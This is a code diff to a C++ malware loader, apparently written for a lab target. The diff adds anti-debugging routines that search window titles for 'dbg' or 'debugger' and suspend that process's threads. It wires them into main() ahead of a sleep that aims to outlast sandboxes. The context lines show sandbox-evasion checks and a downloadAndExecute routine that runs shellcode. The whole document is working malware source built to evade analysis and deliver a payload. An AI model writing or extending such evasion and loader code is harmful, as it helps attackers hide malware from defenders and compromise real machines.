@@ -4,6 +4,7 @@
 /
 /   TODO: implement common sandbox evasion techniques.
 /   ADDED: memory checker, Windows DC check, IP address checker, sleep timer.
+/   ADDED: very basic anti-debugging functionality.
 /
 ************************************************************************/
 #include <iostream>
@@ -25,6 +26,8 @@ const int SHELLCODE_SIZE = 510;
 const int EXPLORER_PID = 5780;
 // IP address of your target:
 const char* TARGET_IP = "10.10.119.64";
+// If a debugger is found, this is used to store the corresponding PID...
+DWORD g_dwDebuggerProcessId = -1;
 
 bool memoryCheck() {
     // Check memory size. Most sandboxes use low specs to limit the impact on the host system.
@@ -38,6 +41,89 @@ bool memoryCheck() {
     else {
         return false;
     }
+}
+
+bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM dwProcessId)
+{
+    // Itterate over all windows and look for "dbg" or "debugger" in the window title
+    DWORD dwWindowProcessId;
+    GetWindowThreadProcessId(hwnd, &dwWindowProcessId);
+
+    if (dwProcessId == dwWindowProcessId)
+    {
+		int windowTitleSize = GetWindowTextLengthW(hwnd);
+		if ( windowTitleSize <= 0 )
+		{
+			return true;
+		}
+		wchar_t* windowTitle = (wchar_t*)malloc((windowTitleSize + 1) * sizeof(wchar_t));
+		
+        GetWindowTextW(hwnd, windowTitle, windowTitleSize + 1);
+
+		if (wcsstr(windowTitle, L"dbg") != 0 ||
+			wcsstr(windowTitle, L"debugger") != 0 )
+		{
+            // Looks like we found a debugger running! Let's remember the PID.
+            g_dwDebuggerProcessId = dwProcessId;
+			return false;
+		}
+ 
+       return false;
+    }
+
+    return true;
+}
+
+DWORD IsDebuggerProcess(DWORD dwProcessId)
+{
+    EnumWindows(EnumWindowsProc, (LPARAM)dwProcessId);
+    return g_dwDebuggerProcessId == dwProcessId;
+}
+
+DWORD SuspendDebuggerThread()
+{
+    // Use SuspendThread() to suspend the running debugger, ruining someones day.
+    // Sadly this can be patched quick&dirty by changing any SuspendThread() calls to 0x90h (NOP) instructions.
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE)
+	{
+        printf("Failed to create snapshot\n");
+        return 1;
+    }
+
+    THREADENTRY32 te32;
+    te32.dwSize = sizeof(THREADENTRY32);
+
+    if (!Thread32First(hSnapshot, &te32))
+	{
+        printf("Failed to get first thread\n");
+        CloseHandle(hSnapshot);
+        return 1;
+    }
+
+    do
+	{
+        HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
+        if (hThread != NULL)
+		{
+            DWORD dwProcessId = GetProcessIdOfThread(hThread);
+			if ( IsDebuggerProcess(dwProcessId) )
+			{
+                // Remove this from production code.
+				printf("[INFO] We have Debugger with pid %i! Suspending!\n", dwProcessId);
+				DWORD result = SuspendThread(hThread);
+ 				if ( result == -1 )
+				{
+					printf("Last error: %i\n", GetLastError());
+				}
+			}
+            CloseHandle(hThread);
+        }
+    } while (Thread32Next(hSnapshot, &te32));
+
+    CloseHandle(hSnapshot);
+
+    return 0;
 }
 
 bool isDomainController() {
@@ -121,6 +207,9 @@ int downloadAndExecute() {
 }
 
 int main() {
+    // Look for debugger and SuspendThread() it...
+    SuspendDebuggerThread();
+
     // Try to sleep through sandbox...
     sleep(300); // sleep_timer in seconds, about 5 min should be realistic tho...
     
